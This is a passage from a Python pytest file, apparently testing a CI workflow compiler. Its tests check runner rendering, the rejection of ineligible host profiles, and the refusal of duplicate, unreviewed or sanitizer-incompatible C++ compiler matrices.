 assert render.count('runs-on: ubuntu-24.04')==2
 with pytest.raises(ProviderError,match='requires exactly one eligible'):
  compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,host_profiles='ubuntu-24.04-x64')


def test_compiler_matrix_refuses_duplicates_unreviewed_and_msvc_sanitizer(tmp_path):
 root=fixture(tmp_path)
 argv=['ctest','--test-dir','build/ci','--output-junit','dist/cpp-tests.xml']
 base={'ci_cpp_manager':'cmake','ci_cpp_manager_version':'3.31','ci_cpp_preset':'ci',
       'ci_cpp_build_type':'Debug','ci_cpp_compiler':'gcc','ci_cpp_compiler_version':'14',
       'ci_cpp_operation':'test','ci_cpp_sanitizer':'none'}
 for matrix in ('gcc:14,gcc:14','gcc:14,msvc:20','clang:17,msvc:19.4'):
  with pytest.raises(CppError,match='matrix|primary pin'):
   inspect_cpp_job(root,argv,{**base,'ci_cpp_compiler_matrix':matrix})
 with pytest.raises(CppError,match='sanitizer'):
  inspect_cpp_job(root,argv,{**base,'ci_cpp_compiler_matrix':'gcc:14,msvc:19.4','ci_cpp_sanitizer':'undefined'})
